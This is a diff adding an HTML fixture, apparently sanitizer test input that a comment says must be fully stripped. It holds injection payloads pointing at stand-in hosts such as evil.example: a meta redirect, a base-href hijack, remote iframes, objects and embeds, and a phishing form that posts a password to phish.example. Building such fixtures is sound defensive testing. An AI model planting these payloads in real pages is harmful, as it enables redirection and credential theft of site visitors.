@@ -1,0 +1,15 @@
+<!-- Frames, plugins, forms and document-level tags. All must go. -->
+<meta http-equiv="refresh" content="0;url=https://evil.example/">
+<base href="https://evil.example/">
+<link rel="stylesheet" href="https://evil.example/s.css">
+<iframe src="https://evil.example/frame"></iframe>
+<frameset><frame src="https://evil.example/f"></frameset>
+<object data="https://evil.example/o.swf"></object>
+<embed src="https://evil.example/e.swf">
+<applet code="x.class"></applet>
+<form action="https://phish.example/login" method="post">
+  <input name="password" type="password"><button>Sign in</button>
+  <input type="image" src="https://evil.example/btn.png">
+</form>
+<p>Your account needs attention.</p>
+<portal src="https://evil.example/p"></portal>
